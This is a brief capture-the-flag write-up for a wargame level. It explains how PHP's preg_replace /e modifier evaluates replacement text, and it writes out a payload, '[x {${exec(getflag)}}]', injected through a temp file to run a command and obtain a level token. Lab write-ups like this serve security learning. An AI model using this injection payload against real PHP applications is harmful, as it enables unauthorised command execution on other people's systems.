## Command injection in PHP exe

First, I tried to compile the .php file and it gave me a warning during the compilation :

```Warning: preg_replace(): The /e modifier is no longer supported```

Then, I searched for a exploit with this modifier, I found that the second argument from ```preg_replace``` is interpreted as code and not as a string.
So, I just added this in the second argument in a tempory file which I inject in executable argv[1] :

```echo '[x {${exec(getflag)}}]' > /tmp/oui```

And I got this result when I started the executable :

```
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1```
